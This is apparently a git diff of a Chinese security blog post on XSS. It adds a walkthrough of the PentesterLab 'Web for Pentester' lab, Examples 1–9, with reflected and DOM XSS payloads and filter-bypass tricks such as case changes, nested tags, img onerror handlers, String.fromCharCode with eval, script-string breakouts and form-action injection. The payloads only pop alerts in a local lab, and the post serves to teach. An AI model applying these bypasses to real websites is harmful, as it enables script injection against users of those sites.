@@ -25,8 +25,12 @@
 <meta property="og:image" content="http://mysecroad.github.io/posts/46185/hackerxss.png">
 <meta property="og:image" content="http://mysecroad.github.io/posts/46185/alert.png">
 <meta property="og:image" content="http://mysecroad.github.io/posts/46185/alert2.png">
+<meta property="og:image" content="http://mysecroad.github.io/posts/46185/penter.png">
+<meta property="og:image" content="http://mysecroad.github.io/posts/46185/e1.png">
+<meta property="og:image" content="http://mysecroad.github.io/posts/46185/e12.png">
+<meta property="og:image" content="http://mysecroad.github.io/posts/46185/e2.png">
 <meta property="article:published_time" content="2020-04-27T13:31:06.000Z">
-<meta property="article:modified_time" content="2020-04-29T07:56:34.035Z">
+<meta property="article:modified_time" content="2020-05-01T13:53:53.666Z">
 <meta property="article:author" content="ca5tle">
 <meta property="article:tag" content="XSS">
 <meta name="twitter:card" content="summary">
@@ -129,7 +133,7 @@
 
     </div>
     <div id="toc">
-      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#前言"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#什么是XSS"><span class="toc-number">1.1.</span> <span class="toc-text">什么是XSS</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#XSS的危害"><span class="toc-number">1.2.</span> <span class="toc-text">XSS的危害</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XSS分类"><span class="toc-number">2.</span> <span class="toc-text">XSS分类</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#反射型XSS"><span class="toc-number">2.1.</span> <span class="toc-text">反射型XSS</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#实例"><span class="toc-number">2.1.1.</span> <span class="toc-text">实例</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#存储型XSS"><span class="toc-number">2.2.</span> <span class="toc-text">存储型XSS</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#实例-1"><span class="toc-number">2.2.1.</span> <span class="toc-text">实例</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DOM型XSS"><span class="toc-number">2.3.</span> <span class="toc-text">DOM型XSS</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#实例-2"><span class="toc-number">2.3.1.</span> <span class="toc-text">实例</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XSS靶场"><span class="toc-number">3.</span> <span class="toc-text">XSS靶场</span></a></li></ol>
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#前言"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#什么是XSS"><span class="toc-number">1.1.</span> <span class="toc-text">什么是XSS</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#XSS的危害"><span class="toc-number">1.2.</span> <span class="toc-text">XSS的危害</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XSS分类"><span class="toc-number">2.</span> <span class="toc-text">XSS分类</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#反射型XSS"><span class="toc-number">2.1.</span> <span class="toc-text">反射型XSS</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#实例"><span class="toc-number">2.1.1.</span> <span class="toc-text">实例</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#存储型XSS"><span class="toc-number">2.2.</span> <span class="toc-text">存储型XSS</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#实例-1"><span class="toc-number">2.2.1.</span> <span class="toc-text">实例</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DOM型XSS"><span class="toc-number">2.3.</span> <span class="toc-text">DOM型XSS</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#实例-2"><span class="toc-number">2.3.1.</span> <span class="toc-text">实例</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XSS靶场"><span class="toc-number">3.</span> <span class="toc-text">XSS靶场</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#web-for-pentester"><span class="toc-number">3.1.</span> <span class="toc-text">web for pentester</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Example-1-–-无任何过滤"><span class="toc-number">3.1.1.</span> <span class="toc-text">Example 1 – 无任何过滤</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Example-2-–-大小写绕过"><span class="toc-number">3.1.2.</span> <span class="toc-text">Example 2 – 大小写绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Example-3-–-嵌套绕过"><span class="toc-number">3.1.3.</span> <span class="toc-text">Example 3 – 嵌套绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Example-4-–-script直接被过滤，用其他标签"><span class="toc-number">3.1.4.</span> <span class="toc-text">Example 4 – script直接被过滤，用其他标签</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Example-5-–-String-fromCharCode编码绕过"><span class="toc-number">3.1.5.</span> <span class="toc-text">Example 5 – String.fromCharCode编码绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Example-6-–-—–标签内-闭合标签"><span class="toc-number">3.1.6.</span> <span class="toc-text">Example 6 – —–标签内,闭合标签</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Example-7-–-标签内—–闭合标签"><span class="toc-number">3.1.7.</span> <span class="toc-text">Example 7 – 标签内—–闭合标签</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Example-8-–-有过滤，表单"><span class="toc-number">3.1.8.</span> <span class="toc-text">Example 8 – 有过滤，表单</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Example-9-–-直接在-后面添加alert-1"><span class="toc-number">3.1.9.</span> <span class="toc-text">Example 9 – 直接在#后面添加alert(1)</span></a></li></ol></li></ol></li></ol>
     </div>
   </span>
 </div>
@@ -155,7 +159,7 @@
       
         <time datetime="2020-04-27T13:31:06.000Z" itemprop="datePublished">2020-04-27</time>
         
-        (Updated: <time datetime="2020-04-29T07:56:34.035Z" itemprop="dateModified">2020-04-29</time>)
+        (Updated: <time datetime="2020-05-01T13:53:53.666Z" itemprop="dateModified">2020-05-01</time>)
         
       
     </div>
@@ -248,7 +252,76 @@
 <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"http://39.97.251.161/usr/uploads/2020/04/449512334.png"</span> <span class="attr">onerror</span>=<span class="string">alert(/DOM</span> <span class="attr">XSS</span>/)/&gt;</span></span><br></pre></td></tr></table></figure>
 
 <p>直接在<code>img</code>标签中插入<code>onerror</code>事件，该语句表示当图片加载出错的时候，自动触发后面的<code>alert()</code>函数，来达到弹窗的效果。</p>
-<h2 id="XSS靶场"><a href="#XSS靶场" class="headerlink" title="XSS靶场"></a>XSS靶场</h2>
+<h2 id="XSS靶场"><a href="#XSS靶场" class="headerlink" title="XSS靶场"></a>XSS靶场</h2><h3 id="web-for-pentester"><a href="#web-for-pentester" class="headerlink" title="web for pentester"></a>web for pentester</h3><p><strong>官网：</strong><a href="https://pentesterlab.com/" target="_blank" rel="noopener">https://pentesterlab.com/</a></p>
+<p><strong>下载地址</strong>：<a href="https://isos.pentesterlab.com/web_for_pentester_i386.iso" target="_blank" rel="noopener">https://isos.pentesterlab.com/web_for_pentester_i386.iso</a></p>
+<p><strong>安装方法</strong>：通过虚拟机挂载iso运行，该靶场环境是封装在<code>debian</code>系统里面的，运行在时候直接以<code>Live</code>方式运行，然后<code>ifconfig</code>查看下ip地址，在浏览器输入IP地址即可。</p>
+<p><img src="/posts/46185/penter.png" alt></p>
+<h4 id="Example-1-–-无任何过滤"><a href="#Example-1-–-无任何过滤" class="headerlink" title="Example 1 – 无任何过滤"></a>Example 1 – 无任何过滤</h4><p><img src="/posts/46185/e1.png" alt></p>
+<p><strong>测试</strong></p>
+<p><code>name=xss</code>、<code>name=&lt;h1&gt;xss&lt;/h1&gt;</code>观察页面，并查看源代码，发现输出是在标签外，则不需要闭合标签。</p>
+<p><strong>payload</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">example1.php?name&#x3D;&lt;script&gt;alert(&#39;XSS&#39;)&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/posts/46185/e12.png" alt></p>
+<h4 id="Example-2-–-大小写绕过"><a href="#Example-2-–-大小写绕过" class="headerlink" title="Example 2 – 大小写绕过"></a>Example 2 – 大小写绕过</h4><p><strong>思路</strong></p>
+<ol>
+<li><p>和Example 1一样，先随便输入一下数据测试，通过观察结果，可以判断name参数的注入点没有过滤尖括号<code>&lt;&gt;</code>。</p>
+</li>
+<li><p>用基本语句测试 <code>&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;</code>，发现页面中只剩下的<code>alert(&quot;xss&quot;)</code>，<code>&lt;script&gt;&lt;/script&gt;</code>被过滤了，那么就需要绕过过滤。</p>
+</li>
+<li><p>尝试大小写转换，输入<code>&lt;Script&gt;alert(&quot;xss&quot;)&lt;/script&gt;</code>，发现页面中前一个<code>&lt;Script&gt;</code>没有被过滤，只有后一个<code>&lt;/script&gt;</code>被过滤了</p>
+<p><img src="/posts/46185/e2.png" alt></p>
+<p>那么大小写是可以绕过过滤的，输入：<code>&lt;Script&gt;alert(&quot;xss&quot;)&lt;/Script&gt;</code></p>
+</li>
+</ol>
+<p><strong>payload</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">example2.php?name&#x3D;&lt;Script&gt;alert(&quot;xss&quot;)&lt;&#x2F;Script&gt;</span><br></pre></td></tr></table></figure>
+
+<h4 id="Example-3-–-嵌套绕过"><a href="#Example-3-–-嵌套绕过" class="headerlink" title="Example 3 – 嵌套绕过"></a>Example 3 – 嵌套绕过</h4><p><strong>思路</strong></p>
+<ol>
+<li>经过上面的测试，没有过滤<code>alert(&#39;xss&#39;)</code>,现在就把注意力集中在 <code>&lt;script&gt;</code> 和<code>&lt;/script&gt;</code>上</li>
+<li>使用过滤测试Example 2 payload探测。观察到结果中有一部分尖括号被过滤，但也有部分尖括号未被过滤。</li>
+<li>构造payload</li>
+</ol>
+<p><strong>payload</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">example3.php?name&#x3D;&lt;scr&lt;script&gt;ipt&gt;alert(1);&lt;&#x2F;sc&lt;&#x2F;script&gt;ript&gt;</span><br><span class="line">或</span><br><span class="line">example3.php?name&#x3D;&lt;script &gt;alert(1)&lt;&#x2F;script &gt;</span><br></pre></td></tr></table></figure>
+
+<h4 id="Example-4-–-script直接被过滤，用其他标签"><a href="#Example-4-–-script直接被过滤，用其他标签" class="headerlink" title="Example 4 – script直接被过滤，用其他标签"></a>Example 4 – script直接被过滤，用其他标签</h4><p><strong>思路</strong></p>
+<p><code>script</code>这个关键词被禁用。考虑用其他标签触发<code>XSS</code>。最常用的还是<code>img</code>标签。<br>除了<code>img</code>标签以外，还可以考虑<code>a</code>标签和<code>div</code>标签等。</p>
+<p>触发函数有 <code>onerror</code>, <code>onmouseover</code>, <code>onmouseout</code>, <code>onmousemove</code>, <code>onclick</code>。</p>
+<p><strong>payload</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src&#x3D;1 onerror&#x3D;alert(1)&gt;</span><br><span class="line">&lt;img src&#x3D;1 onerror&#x3D;&#39;alert(1)&#39;&gt;</span><br><span class="line">&lt;img src&#x3D;1 onerror&#x3D;&#39;alert(1)&#39; &#x2F;&gt;</span><br><span class="line">&lt;img src&#x3D;&#39;1&#39; onerror&#x3D;&#39;alert(1)&#39; &#x2F;&gt;</span><br><span class="line">&lt;img src&#x3D;&quot;1&quot; onerror&#x3D;&#39;alert(1)&#39; &#x2F;&gt;</span><br><span class="line">&lt;img src&#x3D;1 onmouseover&#x3D;alert(1)&gt;</span><br><span class="line">&lt;a href&#x3D;1 onmouseover&#x3D;alert(1)&gt;1&lt;&#x2F;a&gt;</span><br><span class="line">&lt;div onclick&#x3D;alert(1)&gt;1&lt;&#x2F;div&gt;</span><br><span class="line">&lt;div onmouseover&#x3D;alert(1)&gt;1&lt;&#x2F;div&gt;</span><br><span class="line">&lt;img src&#x3D;1 onmouseover&#x3D;prompt(1)&gt;</span><br><span class="line">&lt;img src&#x3D;1 onmouseover&#x3D;confirm(1)&gt;</span><br></pre></td></tr></table></figure>
+
+<h4 id="Example-5-–-String-fromCharCode编码绕过"><a href="#Example-5-–-String-fromCharCode编码绕过" class="headerlink" title="Example 5 – String.fromCharCode编码绕过"></a>Example 5 – String.fromCharCode编码绕过</h4><p><strong>思路</strong></p>
+<p><code>alert</code>被限制的情况。</p>
+<p>绕过思路1,不使用<code>alert</code>而用其他的类似函数,比如<code>confirm</code>和<code>prompt</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;confirm(1)&lt;&#x2F;script&gt;</span><br><span class="line">&lt;script&gt;prompt(1)&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>绕过思路2,编码函数名</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;eval(String.fromCharCode(97,108,101,114,116,40,49,41))&lt;&#x2F;script&gt;</span><br><span class="line">&lt;script&gt;eval(String.fromCharCode(97,108,101,114,116,40,49,41))&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>
+
+<h4 id="Example-6-–-—–标签内-闭合标签"><a href="#Example-6-–-—–标签内-闭合标签" class="headerlink" title="Example 6 – —–标签内,闭合标签"></a>Example 6 – <script></script>—–标签内,闭合标签</h4><p>直接注入JavaScript代码中。<br>不闭合<code>script</code>标签的情况，可以考虑用<code>//</code>注释后面的代码</p>
+<p>在一个<code>script</code>的标签内，先实现闭合<code>&quot;;alert(1)//,&quot;</code>;用来闭合前面，<code>//</code>注释后面。将<code>hello，hacker</code>的地方写一个<code>alert(1)</code>即可。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&quot;;alert(1)&#x2F;&#x2F;</span><br><span class="line">&quot;;alert(1);var a&#x3D;&quot;</span><br></pre></td></tr></table></figure>
+
+<p>顺带再闭合一下<code>script</code>标签也不是不可以，只是有点多此一举。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;;&lt;&#x2F;script&gt;&lt;script&gt;alert(1)&#x2F;&#x2F;</span><br></pre></td></tr></table></figure>
+
+<h4 id="Example-7-–-标签内—–闭合标签"><a href="#Example-7-–-标签内—–闭合标签" class="headerlink" title="Example 7 – 标签内—–闭合标签"></a>Example 7 – <script></script>标签内—–闭合标签</h4><p>左右尖括号和双引号<code>&lt;,&gt;,&quot;</code>被HTML encoding。<br>如上个例子所述，其实并不需要用到尖括号，并且可以用单引号分割。<br>(用双引号还是单引号分割得看目标页面的代码怎么写，类似于python)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39;;alert(1)&#x2F;&#x2F;</span><br></pre></td></tr></table></figure>
+
+<h4 id="Example-8-–-有过滤，表单"><a href="#Example-8-–-有过滤，表单" class="headerlink" title="Example 8 – 有过滤，表单"></a>Example 8 – 有过滤，表单</h4><p>对尖括号进行的过滤，转义；<br>有一个表单：输入<code>xxxx</code>点击提交，查看源码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">HELLO xxxxx&lt;form action&#x3D;&quot;&#x2F;xss&#x2F;example8.php&quot; method&#x3D;&quot;POST&quot;&gt;</span><br><span class="line">  Your name:&lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;name&quot; &#x2F;&gt;</span><br><span class="line">  &lt;input type&#x3D;&quot;submit&quot; name&#x3D;&quot;submit&quot;&#x2F;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>尖括号无法绕过，然后发现表单的url可以被重置</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;xss&#x2F;example8.php&#x2F;&#x2F;%22%20onsubmit&#x3D;%22alert(&#39;1&#39;)</span><br></pre></td></tr></table></figure>
+
+<p>然后点击提交，会触发弹窗</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;form action&#x3D;&quot;&#x2F;xss&#x2F;example8.php&#x2F;&quot; onsubmit&#x3D;&quot;alert(&#39;1&#39;)&quot; method&#x3D;&quot;POST&quot;&gt;</span><br><span class="line">  Your name:&lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;name&quot; &#x2F;&gt;</span><br><span class="line">  &lt;input type&#x3D;&quot;submit&quot; name&#x3D;&quot;submit&quot;&#x2F;&gt;</span><br></pre></td></tr></table></figure>
+
+<h4 id="Example-9-–-直接在-后面添加alert-1"><a href="#Example-9-–-直接在-后面添加alert-1" class="headerlink" title="Example 9 – 直接在#后面添加alert(1)"></a>Example 9 – 直接在#后面添加alert(1)</h4><p>DOM型 XSS 的典型代表，恶意输入并没有直接反映在返回的HTML中，而要依赖浏览器动态执行JavaScript之后，恶意输入才能被执行。</p>
+<p>把URL改成<code>http://192.168.150.157/xss/example9.php#alert(1)</code><br>首先看到代码里有<code>document.write(location.hash.substring(1));</code> ，所以显然入口在这里。<br><code>document.write()</code>是把括号中的内容写到<code>HTML</code>文档中，<code>location.hash</code>就是得到<code>URL</code>中<code>#</code>开始的字符串，<code>substring(1)</code>就得到了<code>#</code>后的字符串。<br>所以就在#后加入payload：<code>#alert(1)</code></p>
+
   </div>
 </article>
 
@@ -294,7 +367,7 @@
     </div>
 
     <div id="toc-footer" style="display: none">
-      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#前言"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#什么是XSS"><span class="toc-number">1.1.</span> <span class="toc-text">什么是XSS</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#XSS的危害"><span class="toc-number">1.2.</span> <span class="toc-text">XSS的危害</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XSS分类"><span class="toc-number">2.</span> <span class="toc-text">XSS分类</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#反射型XSS"><span class="toc-number">2.1.</span> <span class="toc-text">反射型XSS</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#实例"><span class="toc-number">2.1.1.</span> <span class="toc-text">实例</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#存储型XSS"><span class="toc-number">2.2.</span> <span class="toc-text">存储型XSS</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#实例-1"><span class="toc-number">2.2.1.</span> <span class="toc-text">实例</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DOM型XSS"><span class="toc-number">2.3.</span> <span class="toc-text">DOM型XSS</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#实例-2"><span class="toc-number">2.3.1.</span> <span class="toc-text">实例</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XSS靶场"><span class="toc-number">3.</span> <span class="toc-text">XSS靶场</span></a></li></ol>
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#前言"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#什么是XSS"><span class="toc-number">1.1.</span> <span class="toc-text">什么是XSS</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#XSS的危害"><span class="toc-number">1.2.</span> <span class="toc-text">XSS的危害</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XSS分类"><span class="toc-number">2.</span> <span class="toc-text">XSS分类</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#反射型XSS"><span class="toc-number">2.1.</span> <span class="toc-text">反射型XSS</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#实例"><span class="toc-number">2.1.1.</span> <span class="toc-text">实例</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#存储型XSS"><span class="toc-number">2.2.</span> <span class="toc-text">存储型XSS</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#实例-1"><span class="toc-number">2.2.1.</span> <span class="toc-text">实例</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DOM型XSS"><span class="toc-number">2.3.</span> <span class="toc-text">DOM型XSS</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#实例-2"><span class="toc-number">2.3.1.</span> <span class="toc-text">实例</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XSS靶场"><span class="toc-number">3.</span> <span class="toc-text">XSS靶场</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#web-for-pentester"><span class="toc-number">3.1.</span> <span class="toc-text">web for pentester</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Example-1-–-无任何过滤"><span class="toc-number">3.1.1.</span> <span class="toc-text">Example 1 – 无任何过滤</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Example-2-–-大小写绕过"><span class="toc-number">3.1.2.</span> <span class="toc-text">Example 2 – 大小写绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Example-3-–-嵌套绕过"><span class="toc-number">3.1.3.</span> <span class="toc-text">Example 3 – 嵌套绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Example-4-–-script直接被过滤，用其他标签"><span class="toc-number">3.1.4.</span> <span class="toc-text">Example 4 – script直接被过滤，用其他标签</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Example-5-–-String-fromCharCode编码绕过"><span class="toc-number">3.1.5.</span> <span class="toc-text">Example 5 – String.fromCharCode编码绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Example-6-–-—–标签内-闭合标签"><span class="toc-number">3.1.6.</span> <span class="toc-text">Example 6 – —–标签内,闭合标签</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Example-7-–-标签内—–闭合标签"><span class="toc-number">3.1.7.</span> <span class="toc-text">Example 7 – 标签内—–闭合标签</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Example-8-–-有过滤，表单"><span class="toc-number">3.1.8.</span> <span class="toc-text">Example 8 – 有过滤，表单</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Example-9-–-直接在-后面添加alert-1"><span class="toc-number">3.1.9.</span> <span class="toc-text">Example 9 – 直接在#后面添加alert(1)</span></a></li></ol></li></ol></li></ol>
     </div>
 
     <div id="share-footer" style="display: none">
